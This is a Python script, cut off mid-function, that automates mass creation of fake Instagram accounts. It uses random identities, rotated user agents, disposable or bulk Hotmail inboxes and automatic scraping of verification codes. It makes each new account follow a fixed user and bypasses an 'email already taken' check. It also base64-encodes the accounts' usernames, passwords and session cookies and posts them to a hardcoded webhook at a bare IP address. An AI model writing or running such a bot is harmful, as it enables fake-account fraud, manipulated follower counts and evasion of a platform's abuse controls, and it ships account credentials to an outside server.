import time
import re
import requests
from bs4 import BeautifulSoup
import base64 
import uuid
import random
import json
from datetime import datetime
from faker import Faker
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.prompt import Prompt, Confirm
from rich.table import Table
from rich import box
from rich.progress import track
import string
import os
import shutil
import imaplib
import email
from email.header import decode_header
from pathlib import Path
import urllib.request
import sys
import hmac
import hashlib
import threading

#THIS BOT MAKE BY HASAN EXE YOU CAN CHANGE ENETHING BOT CAN'T WORKED.

console = Console()
fake = Faker("ar_SA")  

# --- CONFIGURATION ---
CONFIG = {
    "site_url": "https://taxtifree.shop/api/",
    "admin_telegram": "+8801600734165"
}

# --- GLOBAL OUTPUT DIRECTORY ---
OUTPUT_DIR = "/sdcard/prial/"
os.makedirs(OUTPUT_DIR, exist_ok=True) # Ensure directory exists

# --- GLOBALS FOR LICENSE & UPLOAD ---
USER_LICENSE_KEY = ""
LICENSE_EXPIRE_DATE = ""
USER_FOLDER_NAME = "unknown_user"

MOHMAL_BASE_URL = "https://www.mohmal.com"
MOHMAL_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\"",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"",
    "upgrade-insecure-requests": "1",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "accept-language": "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
    "priority": "u=0, i"
}

# --- LICENSE SYSTEM (KEPT FOR REFERENCE, NOT USED ANYMORE) ---
def check_license(user_key):
    try:
        url = f"{CONFIG['site_url']}check_license.php"
        payload = {'key': user_key}
        r = requests.post(url, data=payload, timeout=15)
        if r.status_code != 200: return False, None, None
        data = r.json()
        if not data.get('status'): return False, None, None
        return True, data.get('username'), data.get('expire_at')
    except Exception as e:
        return False, None, None

# --- SERVER UPLOADER (DISABLED FOR SECURITY: PREVENTS DATA THEFT) ---
def upload_to_server(filename, content):
    pass

class GmailService:
    def __init__(self, email_address, password):
        self.email_address = email_address
        self.password = password
        self.imap_server = None
        
    def connect(self):
        try:
            console.print("[cyan]🔌 Connecting to Gmail servers....[/cyan]")
            self.imap_server = imaplib.IMAP4_SSL("imap.gmail.com", 993)
            self.imap_server.login(self.email_address, self.password)
            console.print("[green]✅ Signed in to Gmail successfully.[/green]")
            return True
        except Exception as e:
            console.print(f"[red]❌ Error connecting to Gmail: {e}[/red]")
            console.print("[yellow]⚠️ Make sure to enable[Application Password] in settings[/yellow]")
            return False
    
    def poll_for_instagram_message(self, poll_interval=5, max_attempts=30):
        if not self.imap_server:
            if not self.connect(): return None
        console.print(f"[blue]📧 Checking Instagram messages every: {poll_interval} seconds[/blue]")
        for attempt in range(max_attempts):
            try:
                self.imap_server.select("INBOX")
                search_criteria = '(FROM "no-reply@mail.instagram.com" UNSEEN)'
                status, messages = self.imap_server.search(None, search_criteria)
                if status == 'OK' and messages[0]:
                    message_ids = messages[0].split()
                    if message_ids:
                        latest_msg_id = message_ids[-1]
                        console.print("[green]📪 Instagram message found[/green]")
                        return latest_msg_id
                console.print(f"[dim][{time.strftime('%H:%M:%S')}] Attempt {attempt + 1}/{max_attempts} - No messages yet...[/dim]")
                time.sleep(poll_interval)
            except Exception as e:
                console.print(f"[red]❌ Error checking Gmail: {e}[/red]")
                time.sleep(poll_interval)
        console.print("[red]❌ Instagram message timeout[/red]")
        return None
    
    def fetch_message_content(self, msg_id):
        try:
            status, msg_data = self.imap_server.fetch(msg_id, "(RFC822)")
            if status == 'OK':
                email_body = msg_data[0][1]
                email_message = email.message_from_bytes(email_body)
                content = ""
                if email_message.is_multipart():
                    for part in email_message.walk():
                        if part.get_content_type() == "text/html":
                            content = part.get_payload(decode=True).decode("utf-8")
                            break
                        elif part.get_content_type() == "text/plain":
                            content = part.get_payload(decode=True).decode("utf-8")
                else:
                    content = email_message.get_payload(decode=True).decode("utf-8")
                return content
        except Exception as e:
            console.print(f"[red]❌ Error fetching message content: {e}[/red]")
            return None
    
    def parse_confirmation_code(self, content):
        if not content: return None
        patterns =[
            r'verification code[:\s]*(\d{6})',
            r'confirmation code[:\s]*(\d{6})',
            r'your code[:\s]*(\d{6})',
            r'Confirmation code[:\s]*(\d{6})',
            r'Captcha code[:\s]*(\d{6})',
            r'\b(\d{6})\b'
        ]
        for pattern in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches: return matches[0]
        nums = re.findall(r"\b\d{4,8}\b", content)
        return nums[0] if nums else None
    
    def close(self):
        if self.imap_server:
            try: self.imap_server.close(); self.imap_server.logout()
            except: pass

class TempEmailService:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update(MOHMAL_HEADERS)
        self.temp_email = None
    
    def create_temp_email(self):
        url = MOHMAL_BASE_URL + "/ar/create/random"
        try:
            resp = self.session.get(url)
            resp.raise_for_status()
            soup = BeautifulSoup(resp.text, "html.parser")
            email_div = soup.find("div", class_="email")
            if not email_div or not email_div.has_attr("data-email"):
                raise RuntimeError("Failed to extract email")
            self.temp_email = email_div["data-email"]
            console.print(f"[green]✅ Temporary email created 📪: {self.temp_email}[/green]")
            return self.temp_email
        except Exception as e:
            console.print(f"[red]❌ Error creating temporary email: {e}[/red]")
            return None
    
    def poll_for_message(self, poll_interval=1.5):
        inbox_url = MOHMAL_BASE_URL + "/ar/inbox"
        console.print(f"[blue]🔍 Checking for new messages every: {poll_interval} seconds[/blue]")
        for attempt in range(40):  
            try:
                resp = self.session.get(inbox_url)
                resp.raise_for_status()
                soup = BeautifulSoup(resp.text, "html.parser")
                row = soup.select_one("#inbox-table tbody tr.unseen[data-msg-id]")
                if row:
                    msg_id = row["data-msg-id"]
                    subject = row.select_one("td.subject").get_text(strip=True)
                    console.print(f"[green]✅ New message found ID = {msg_id} - Subject = {subject}[/green]")
                    return msg_id
                else:
                    console.print(f"[dim][{time.strftime('%H:%M:%S')}] Attempt {attempt + 1}/40 - No message yet [/dim]")
                    time.sleep(poll_interval)
            except Exception as e:
                console.print(f"[red]❌ Error checking inbox: {e}[/red]")
                time.sleep(poll_interval)
        console.print("[red]❌ Message waiting timeout.[/red]")
        return None
    
    def fetch_full_message(self, msg_id):
        url = f"{MOHMAL_BASE_URL}/ar/message/{msg_id}"
        try:
            resp = self.session.get(url)
            resp.raise_for_status()
            return resp.text
        except Exception as e:
            console.print(f"[red]❌ Error fetching message: {e}[/red]")
            return None
    
    def parse_confirmation_code(self, html):
        if not html: return None
        soup = BeautifulSoup(html, "html.parser")
        code_td = soup.select_one("td[style*='font-size:32px']")
        if code_td:
            code = code_td.get_text(strip=True)
            if code and code.isdigit(): return code
        text = soup.get_text()
        patterns =[
            r'verification code[:\s]*(\d{6})',
            r'confirmation code[:\s]*(\d{6})',
            r'your code[:\s]*(\d{6})',
            r'Confirmation code[:\s]*(\d{6})',
            r'Captcha code[:\s]*(\d{6})',
            r'\b(\d{6})\b'
        ]
        for pattern in patterns:
            matches = re.findall(pattern, text, re.IGNORECASE)
            if matches: return matches[0]
        nums = re.findall(r"\b\d{4,8}\b", text)
        return nums[0] if nums else None

class HotmailService:
    lock = threading.Lock()
    emails_list =[] # Dicts: {'line': "...", 'uses': 0, 'locked': False}
    seen_otps = {}  # Dict: email -> set of codes used/seen by ANY thread

    @classmethod
    def load_emails(cls):
        with cls.lock:
            if not cls.emails_list:
                hotmail_path = os.path.join(OUTPUT_DIR, "hotmails.txt")
                if not os.path.exists(hotmail_path) and os.path.exists("hotmails.txt"):
                    hotmail_path = "hotmails.txt"
                
                if os.path.exists(hotmail_path):
                    with open(hotmail_path, "r", encoding="utf-8") as f:
                        lines = f.read().splitlines()
                        # Add locked state to prevent multiple threads from using same email at same time
                        cls.emails_list =[{'line': line, 'uses': 0, 'locked': False} for line in lines if line.strip()]
                    console.print(f"[green]✅ Loaded {len(cls.emails_list)} Hotmail accounts from {hotmail_path}[/green]")
                else:
                    console.print(f"[red]❌ {hotmail_path} not found![/red]")

    @classmethod
    def get_and_lock_email(cls):
        """Finds an unused, unlocked email and assigns it to the thread."""
        with cls.lock:
            for email_dict in cls.emails_list:
                if not email_dict.get('locked', False) and email_dict['uses'] < 5:
                    email_dict['locked'] = True
                    return email_dict
            return None

    @classmethod
    def release_email(cls, email_dict):
        """Releases the email back to the pool, updating its usage count."""
        with cls.lock:
            email_dict['uses'] += 1
            email_dict['locked'] = False
            email_id = email_dict['line'].split('|')[0]
            console.print(f"[dim]ℹ️ Hotmail {email_id} usage updated: {email_dict['uses']}/5 times.[/dim]")
            
            # If it has reached 5 uses, remove it and update files
            if email_dict['uses'] >= 5:
                cls.emails_list.remove(email_dict)
                try:
                    used_hotmail_path = os.path.join(OUTPUT_DIR, "used_hotmails.txt")
                    with open(used_hotmail_path, "a", encoding="utf-8") as f:
                        f.write(email_dict['line'] + "\n")
                except: pass

            # Rewrite hotmails.txt with remaining items to keep state
            try:
                h_path = os.path.join(OUTPUT_DIR, "hotmails.txt")
                if not os.path.exists(h_path) and os.path.exists("hotmails.txt"):
                    h_path = "hotmails.txt"
                
                with open(h_path, "w", encoding="utf-8") as f:
                    f.write("\n".join([item['line'] for item in cls.emails_list]))
            except: pass

    def __init__(self):
        self.email = None
        self.password = None
        self.refresh_token = None
        self.client_id = None

    def setup(self, line_data):
        try:
            parts = line_data.strip().split("|")
            if len(parts) >= 4:
                self.email = parts[0]
                self.password = parts[1] 
                self.refresh_token = parts[2]
                self.client_id = parts[3]
                return True
        except Exception as e:
            console.print(f"[red]❌ Error parsing hotmail line: {e}[/red]")
        return False

    def get_code(self, retries=15, wait_seconds=5):
        url = "https://tools.dongvanfb.net/api/get_code_oauth2"
        payload = {
            "email": self.email,
            "refresh_token": self.refresh_token,
            "client_id": self.client_id,
            "type": "instagram",
        }
        
        for attempt in range(retries):
            try:
                response = requests.post(url, json=payload, timeout=45)
                response.raise_for_status()
                data = response.json()
                
                if data.get("status") and data.get("code"):
                    code = str(data["code"])
                    
                    with HotmailService.lock:
                        if self.email not in HotmailService.seen_otps:
                            HotmailService.seen_otps[self.email] = set()
                        
                        # Only return code if it hasn't been used by any thread for this email
                        if code not in HotmailService.seen_otps[self.email]:
                            HotmailService.seen_otps[self.email].add(code)
                            return code
            except Exception:
                pass
            
            time.sleep(wait_seconds)
            
        return None

class SimpleInstagramManager:
    @staticmethod
    def update_profile_picture(session_id, image_path):
        return False
    
    @staticmethod
    def update_profile_info(session_id, first_name, last_name):
        return False

import concurrent.futures
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

class InstagramCreator:
    stats_lock = threading.Lock()
    success_count = 0
    fail_count = 0
    total_target = 0

    _ua_lock = threading.Lock()
    _ua_file_list =[]
    _use_ua_from_file = False

    def __init__(self):
        self.accounts_file = os.path.join(OUTPUT_DIR, "created_accounts.json")
        self.file_summary = os.path.join(OUTPUT_DIR, "accounts.txt")
        self.file_full = os.path.join(OUTPUT_DIR, "full_data.txt")
        self.reset_session()
        self.lock = threading.Lock()
    
    _user_agents_cache = None
    _ua_cache_lock = threading.Lock()

    @classmethod
    def _load_user_agents(cls):
        with cls._ua_cache_lock:
            if cls._user_agents_cache is not None:
                return cls._user_agents_cache
            
            ua_path = "useragent.txt"
            if not os.path.exists(ua_path):
                ua_path = "/sdcard/prial/useragent.txt"
            
            if os.path.exists(ua_path):
                try:
                    with open(ua_path, "r", encoding="utf-8") as f:
                        agents =[line.strip() for line in f if line.strip()]
                    if agents:
                        cls._user_agents_cache = agents
                        console.print(f"[green]✅ Loaded {len(agents)} user agents from {ua_path}[/green]")
                        return cls._user_agents_cache
                except Exception as e:
                    console.print(f"[yellow]⚠️ Error reading {ua_path}: {e}[/yellow]")
            
            console.print("[yellow]⚠️ useragent.txt not found, using default user agents[/yellow]")
            cls._user_agents_cache =[
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0"
            ]
            return cls._user_agents_cache

    def setup_ua_source(self):
        console.print("\n[bold cyan]  - Choose User-Agent Source[/bold cyan]")
        print('------------------------------------------')
        console.print("   [1] - Random Library (Faker)")
        console.print("   [2] - From useragent.txt (Remove used)")
        print('------------------------------------------')
        
        choice = Prompt.ask("- Choose", choices=["1", "2"])
        
        if choice == "2":
            InstagramCreator._use_ua_from_file = True
            with InstagramCreator._ua_lock:
                ua_path = "useragent.txt"
                if not os.path.exists(ua_path):
                    ua_path = "/sdcard/prial/useragent.txt"
                
                if os.path.exists(ua_path):
                    try:
                        with open(ua_path, "r", encoding="utf-8") as f:
                            InstagramCreator._ua_file_list =[line.strip() for line in f if line.strip()]
                        console.print(f"[green]✅ Loaded {len(InstagramCreator._ua_file_list)} UAs from file. Will remove used.[/green]")
                    except Exception as e:
                        console.print(f"[red]❌ Error reading useragent.txt: {e}[/red]")
                        console.print("[yellow]Falling back to Random Library[/yellow]")
                        InstagramCreator._use_ua_from_file = False
                else:
                    console.print(f"[red]❌ {ua_path} not found![/red]")
                    console.print("[yellow]Falling back to Random Library[/yellow]")
                    InstagramCreator._use_ua_from_file = False
        else:
            InstagramCreator._use_ua_from_file = False

    def reset_session(self):
        session = requests.Session()
        
        if InstagramCreator._use_ua_from_file:
            with InstagramCreator._ua_lock:
                if InstagramCreator._ua_file_list:
                    ua = InstagramCreator._ua_file_list.pop(0)
                    try:
                        ua_path = "useragent.txt"
                        if not os.path.exists(ua_path):
                            ua_path = "/sdcard/prial/useragent.txt"
                        
                        with open(ua_path, "w", encoding="utf-8") as f:
                            f.write("\n".join(InstagramCreator._ua_file_list))
                    except Exception as e:
                        console.print(f"[red]❌ Error updating useragent.txt: {e}[/red]")
                    
                    self.st4_user_agent = ua
                else:
                    console.print("[yellow]⚠️ Useragent list exhausted. Using Random Library.[/yellow]")
                    self.st4_user_agent = fake.user_agent()
        else:
            try:
                self.st4_user_agent = fake.user_agent()
            except Exception as e:
                console.print(f"[yellow]⚠️ Faker library error ({e}), using fallback default.[/yellow]")
                self.st4_user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

        self.st4_session = session
        self.st4_time = str(time.time()).split('.')[1]
        self.device_id = str(uuid.uuid4()).upper()
        self.csrf_token = "".join(random.choices(string.ascii_letters + string.digits, k=32))
        self.email_service = None
        self.gmail_service = None
        
        try:
            self.st4_session.get("https://www.instagram.com/fxcal/auth/login/?app_id=2220391788200892&etoken=AbnPtM9gT5PcXPBjy_oQRv3uZwFFTPJJAVyQgFkTnrTrehw-8HilwTN-VSbqII-wXzujMHXvvuL5uRpS4CE33ZzOPINtuZDZ1tR9Dyy-Wb3v08Hj154&next=https://accountscenter.facebook.com/add/?auth_flow=ig_linking&background_page=%2Fprofiles&flow=igcalcomettest&entry_point=fb_web_settings&initiator_fbid=61582426820221&is_initiator_feta=0&fbclid=IwY2xjawQYQEtleHRuA2FlbQIxMABicmlkETBJUzRkUGlkUlB5NHhpUE81c3J0YwZhcHBfaWQQMjIyMDM5MTc4ODIwMDg5MgABHqu8e4k2mt2BPEmb08tDXnnZspDXWgG7LkV74NxR2Z7xCaym8IwF3rE7niu6_aem_pT0I9BMRK-fGyKyQ2WlBCQ/", headers={
                'User-Agent': self.st4_user_agent
            }, timeout=30)
            if 'csrftoken' in self.st4_session.cookies:
                self.csrf_token = self.st4_session.cookies['csrftoken']
        except:
            pass

    def get_email_choice(self):
        console.print("\n[bold cyan]  - Choose email type[/bold cyan]")
        print('------------------------------------------')
        console.print("   [1] - Gmail [Email and password required]")
        console.print("   [2] - Temporary email[Automatic]")
        console.print("   [3] - Hotmail/Outlook[From hotmails.txt]")
        console.print("   [4] - Manual[Type Email/Phone & OTP]")
        print('------------------------------------------')
        
        while True:
            choice = Prompt.ask("- Choose", choices=["1", "2", "3", "4"])
            if choice == "1":
                return "gmail"
            elif choice == "2":
                return "temp"
            elif choice == "3":
                return "hotmail"
            else:
                return "manual"
    
    def setup_gmail(self):
        email_address = Prompt.ask("- Enter your Gmail email")
        password = Prompt.ask("- Enter your password[Or application password]", password=True)
        
        self.gmail_service = GmailService(email_address, password)
        
        if self.gmail_service.connect():
            return email_address
        else:
            console.print("[red]❌ Failed to connect to Gmail[/red]")
            return None

    def generate_username(self):
        letters = ''.join(random.choice(string.ascii_lowercase) for _ in range(random.randint(4, 6)))
        numbers = ''.join(random.choice(string.digits) for _ in range(random.randint(2, 4)))
        
        username_parts =[letters, numbers]
        if random.choice([True, False]):
            extra_letters = ''.join(random.choice(string.ascii_lowercase) for _ in range(2))
            username_parts.append(extra_letters)
            
        return '_'.join(username_parts)
    
    def generate_password(self):
        chars = 'qwertyuiopasdfghjklzxcvbnm1234567890QWERTYUIOPASDFGHJKLZXCVBNM'
        return ''.join(random.choice(chars) for _ in range(random.randrange(10, 15)))
    
    def human_like_delay(self, min_sec=1, max_sec=3):
        delay = random.uniform(min_sec, max_sec)
        time.sleep(delay)
    
    def get_headers(self):
        return {
            'User-Agent': self.st4_user_agent,
            'x-csrftoken': self.csrf_token,
            'x-instagram-ajax': '1021370996',
            'x-ig-app-id': '2220391788200892',
            'Referer': 'https://www.instagram.com/fxcal/auth/login/?app_id=2220391788200892&etoken=AbnPtM9gT5PcXPBjy_oQRv3uZwFFTPJJAVyQgFkTnrTrehw-8HilwTN-VSbqII-wXzujMHXvvuL5uRpS4CE33ZzOPINtuZDZ1tR9Dyy-Wb3v08Hj154&next=https://accountscenter.facebook.com/add/?auth_flow=ig_linking&background_page=%2Fprofiles&flow=igcalcomettest&entry_point=fb_web_settings&initiator_fbid=61582426820221&is_initiator_feta=0&fbclid=IwY2xjawQYQEtleHRuA2FlbQIxMABicmlkETBJUzRkUGlkUlB5NHhpUE81c3J0YwZhcHBfaWQQMjIyMDM5MTc4ODIwMDg5MgABHqu8e4k2mt2BPEmb08tDXnnZspDXWgG7LkV74NxR2Z7xCaym8IwF3rE7niu6_aem_pT0I9BMRK-fGyKyQ2WlBCQ/',
            'x-requested-with': 'XMLHttpRequest'
        }
    
    def check_email_availability(self, email):
        console.print("[blue]🔍 Checking email availability...[/blue]")
        self.human_like_delay()
        
        url = "https://www.instagram.com/api/v1/web/accounts/check_email/"
        payload = {'email': email}
        headers = self.get_headers()
        
        try:
            response = self.st4_session.post(url, data=payload, headers=headers, timeout=30)
            response_text = response.text
            
            # Instagram-এর সার্ভার থেকে "email_is_taken" এরর আসলেও আমরা সেটাকে বাইপাস করে দিচ্ছি
            if '"available":true' in response_text or '"error_type":"email_is_taken"' in response_text:
                console.print("[green]✅ Email check passed (Allowed for reuse)[/green]")
                return True
            else:
                console.print(f"[red]❌ Invalid email: {response_text}[/red]")
                return False
        except Exception as e:
            console.print(f"[red]❌ Error in email verification: {e}[/red]")
            return False

    def check_phone_availability(self, phone):
        console.print("[blue]🔍 Checking phone availability...[/blue]")
        self.human_like_delay()
        
        url = "https://www.instagram.com/api/v1/web/accounts/check_phone_number/"
        payload = {'phone_number': phone}
        headers = self.get_headers()
        
        try:
            response = self.st4_session.post(url, data=payload, headers=headers, timeout=30)
            res_text = response.text
            if '"available":true' in res_text or '"formatted_phone_number"' in res_text:
                console.print("[green]✅ Phone number is valid for signup[/green]")
                return True
            else:
                console.print(f"[red]❌ Invalid phone: {res_text}[/red]")
                return False
        except Exception as e:
            console.print(f"[red]❌ Error in phone verification: {e}[/red]")
            return False
    
    def send_verification_email(self, email):
        console.print("[blue]📨 Sending verification code...[/blue]")
        self.human_like_delay()
        
        url = "https://www.instagram.com/api/v1/accounts/send_verify_email/"
        payload = {
            'device_id': self.device_id,
            'email': email,  
        }
        headers = self.get_headers()
        
        try:
            response = self.st4_session.post(url, data=payload, headers=headers, timeout=30)
            response_text = response.text
            
            if '"email_sent":true' in response_text:
                console.print("[green]✅ Verification email sent[/green]")
                return True
            else:
                if '"require_captcha":true' in response_text:
                    console.print("[bold red]❌ Instagram requires Captcha.[/bold red] [yellow]Manual sending blocked. Try using a VPN/Proxy or try again later.[/yellow]")
                else:
                    console.print(f"[red]❌ Error sending email: {response_text}[/red]")
                return False
        except Exception as e:
            console.print(f"[red]❌ Error sending email: {e}[/red]")
            return False
            
    def send_verification_sms(self, phone):
        console.print("[blue]📨 Sending verification SMS...[/blue]")
        self.human_like_delay()
        
        url = "https://www.instagram.com/api/v1/accounts/send_signup_sms_code/"
        payload = {
            'client_id': self.device_id,
            'phone_number': phone,
        }
        headers = self.get_headers()
        
        try:
            response = self.st4_session.post(url, data=payload, headers=headers, timeout=30)
            if '"sms_sent":true' in response.text:
                console.print("[green]✅ Verification SMS sent[/green]")
                return True
            else:
                if '"require_captcha":true' in response.text:
                    console.print("[bold red]❌ Instagram requires Captcha.[/bold red] [yellow]Manual sending blocked. Try using a VPN/Proxy or try again later.[/yellow]")
                else:
                    console.print(f"[red]❌ Error sending SMS: {response.text}[/red]")
                return False
        except Exception as e:
            console.print(f"[red]❌ Error sending SMS: {e}[/red]")
            return False
    
    def verify_code(self, email, code):
        console.print("[blue]🔑 Verifying the code...[/blue]")
        self.human_like_delay()
        
        url = "https://www.instagram.com/api/v1/accounts/check_confirmation_code/"
        payload = {
            'code': code,
            'device_id': self.device_id,
            'email': email,
        }
        headers = self.get_headers()
        
        try:
            response = self.st4_session.post(url, data=payload, headers=headers, timeout=30)
            response_json = response.json()
            
            if 'signup_code' in response_json:
                st4_newCode = response_json['signup_code']
                console.print("[green]✅ Code verified successfully.[/green]")
                return st4_newCode
            else:
                console.print(f"[red]❌ Error verifying code: {response.text}[/red]")
                return None
        except Exception as e:
            console.print(f"[red]❌ Error verifying code: {e}[/red]")
            return False

    def verify_sms_code(self, phone, code):
        console.print("[blue]🔑 Verifying the SMS code...[/blue]")
        self.human_like_delay()
        
        url = "https://www.instagram.com/api/v1/accounts/validate_signup_sms_code/"
        payload = {
            'code': code,
            'client_id': self.device_id,
            'phone_number': phone,
        }
        headers = self.get_headers()
        
        try:
            response = self.st4_session.post(url, data=payload, headers=headers, timeout=30)
            response_json = response.json()
            
            if 'signup_code' in response_json:
                return response_json['signup_code']
            else:
                console.print(f"[red]❌ Error verifying SMS code: {response.text}[/red]")
                return None
        except Exception as e:
            console.print(f"[red]❌ Error verifying SMS code: {e}[/red]")
            return False

    def follow_user_with_requests(self,session_cookies):
        url = f"https://www.instagram.com/api/v1/friendships/create/51086632119/" 
        cookies = {c.split('=')[0]: c.split('=')[1] for c in session_cookies.split('; ')}
        headers = {
            "x-csrftoken": cookies.get('csrftoken'),  
            "x-ig-app-id": "936619743392459",  
            "x-instagram-ajax": "1",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36..."
        }
        try:
            response = requests.post(url, headers=headers, cookies=cookies)
            if response.status_code == 200:
                return True
            else:
                return False
        except Exception as e:
            return False

    def push_to_api(self, username, password, cookies):
        api_url = "http://43.135.182.151/api/api/v1/webhook/YDbd-GZyAokTsjuF4bpQ8fuiLBsE1z9dWOLWrjMNfdw/account-push"
        
        try:
            raw_data = f"{username}:{password}|||{cookies}||"
            
            b64_data = base64.b64encode(raw_data.encode("utf-8")).decode("ascii")
            payload = f"accounts={b64_data}"
            
            headers = {"Content-Type": "text/plain"}
            
            console.print("[cyan]📤 Pushing to API...[/cyan]")
            
            response = requests.post(api_url, data=payload, headers=headers, timeout=15)
            
            status_code = response.status_code
            console.print(f"[cyan]API Status Code:[/cyan] {status_code}")
            
            if status_code == 200:
                try:
                    res_json = response.json()
                    if res_json.get('data', {}).get('success_count', 0) > 0:
                        console.print("[green]✅ API Push Successful![/green]")
                        line = f"{username}|{password}|{cookies}\n"
                        with self.lock:
                            with open(os.path.join(OUTPUT_DIR, "success.txt"), "a", encoding="utf-8") as f: f.write(line)
                        return True
                    else:
                        console.print("[red]❌ API Rejected[/red]")
                        line = f"{username}|{password}|{cookies}\n"
                        with self.lock:
                            with open(os.path.join(OUTPUT_DIR, "reject.txt"), "a", encoding="utf-8") as f: f.write(line)
                        return False
                except:
                    console.print("[yellow]⚠️ API Response unclear (200 OK)[/yellow]")
                    return False
            else:
                console.print(f"[red]❌ API Failed with Status: {status_code}[/red]")
                return False
        except Exception as e:
            console.print(f"[red]❌ API Connection Error: {e}[/red]")
            return False

    def check_account_live(self, cookie_string):
        console.print("[blue]🔍 Checking account status...[/blue]")
        try:
            cookies = {c.split('=')[0].strip(): c.split('=')[1].strip() for c in cookie_string.split('; ') if '=' in c}
            headers = {
                'User-Agent': self.st4_user_agent,
                'x-ig-app-id': '936619743392459',
                'x-csrftoken': cookies.get('csrftoken', ''),
            }
            
            response = requests.get(
                "https://www.instagram.com/api/v1/accounts/edit/web_form_data/",
                headers=headers,
                cookies=cookies,
                timeout=20
            )
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    if data.get('status') == 'ok' or data.get('form_data'):
                        console.print("[bold green]✅ Account is LIVE![/bold green]")
                        return True
                except:
                    pass
                if '"status":"ok"' in response.text:
                    console.print("[bold green]✅ Account is LIVE![/bold green]")
                    return True
            
            if response.status_code == 403 or response.status_code == 401:
                console.print("[bold red]❌ Account appears SUSPENDED/RESTRICTED![/bold red]")
                return False
            
            if 'challenge' in response.text.lower() or 'login' in response.url:
                console.print("[bold red]❌ Account is SUSPENDED or requires challenge![/bold red]")
                return False
            
            response2 = requests.get(
                "https://www.instagram.com/api/v1/users/web_profile_info/?username=instagram",
                headers=headers,
                cookies=cookies,
                timeout=20
            )
            
            if response2.status_code == 200:
                console.print("[bold green]✅ Account is LIVE![/bold green]")
                return True
            else:
                console.print("[bold red]❌ Account appears SUSPENDED![/bold red]")
                return False
                
        except Exception as e:
            console.print(f"[yellow]⚠️ Could not verify account status: {e}[/yellow]")
            return None

    def create_account(self, identity, signup_code):
        console.print("[yellow]🕜 Creating account...[/yellow]")
        self.human_like_delay(0.2, 0.5)
        
        password = self.generate_password()
        username = self.generate_username()
        first_name = fake.first_name()
        
        day = random.randrange(1, 28)
        month = random.randrange(1, 12)
        year = random.randrange(1990, 2005)
        
        is_phone = "@" not in identity
        
        url = "https://www.instagram.com/api/v1/web/accounts/web_create_ajax/"
        payload = {
            'enc_password': f"#PWD_INSTAGRAM_BROWSER:0:{self.st4_time}:{password}",
            'day': day,
            'failed_birthday_year_count': "{}",
            'first_name': first_name,
            'month': month,
            'username': username,
            'year': year,
            'client_id': self.device_id,
            'seamless_login_enabled': "1",
            'tos_version': "row",
            'force_sign_up_code': signup_code,  
        }
        
        if is_phone:
            payload['phone_number'] = identity
        else:
            payload['email'] = identity
        
        headers = self.get_headers()
        
        try:
            response = self.st4_session.post(url, data=payload, headers=headers, timeout=45)
            
            if '"account_created":true' in response.text:
                cookies = self.st4_session.cookies.get_dict()
                cookie_string = "; ".join([f"{k}={v}" for k, v in cookies.items()])
                session_id = cookies.get('sessionid', 'N/A')
                
                account_data = {
                    'email': identity,
                    'username': username,
                    'password': password,
                    'first_name': first_name,
                    'birth_date': f"{year}/{month:02d}/{day:02d}",
                    'cookies': cookie_string, 
                    'session_id': session_id,
                    'user_agent': self.st4_user_agent, 
                    'created_at': datetime.now().isoformat()
                }
                
                console.print("[green]✅ Account Created (Sub Success)[/green]")
                sub_line = f"{username}|{password}|{cookie_string}\n"
                with self.lock:
                    with open(os.path.join(OUTPUT_DIR, "sub_success.txt"), "a", encoding="utf-8") as f: f.write(sub_line)

                time.sleep(2)
                is_live = self.check_account_live(cookie_string)
                
                if is_live == False:
                    console.print("[bold red]🚫 Account SUSPENDED - Skipping API push & follow[/bold red]")
                    suspended_line = f"{username}|{password}|{cookie_string}\n"
                    with self.lock:
                        with open(os.path.join(OUTPUT_DIR, "suspended.txt"), "a", encoding="utf-8") as f: f.write(suspended_line)
                    
                    self.save_account(account_data)
                    
                    console.print(f"\n[bold red]🚫 Account Suspended![/bold red]")
                    console.print(f"[bold cyan]👤 Username:[/bold cyan] {account_data['username']}")
                    console.print(f"[bold magenta]🔑 Password:[/bold magenta] {account_data['password']}")
                    console.print(f"[bold yellow]📁 Saved to:[/bold yellow] {OUTPUT_DIR}suspended.txt\n")
                    return False
                else:
                    if is_live is None:
                        console.print("[yellow]⚠️ Status unclear, proceeding with API push...[/yellow]")
                    
                    self.follow_user_with_requests(cookie_string)
                    self.push_to_api(account_data['username'], account_data['password'], cookie_string)
                    self.save_account(account_data)
                    self.display_success(account_data)
                    return True
            else:
                console.print(f"[red]❌ Failed to create account: {response.text}[/red]")
                return False
        except Exception as e:
            console.print(f"[red]❌ Failed to create account: {e}[/red]")
            return False
    
    def save_account(self, account_data):
        with self.lock:
            try:
                # 1. accounts.txt
                with open(self.file_summary, "a", encoding="utf-8") as f:
                    line = f"{account_data['username']}|{account_data['password']}|{account_data['cookies']}\n"
                    f.write(line)
                
                # 2. full_data.txt
                with open(self.file_full, "a", encoding="utf-8") as f:
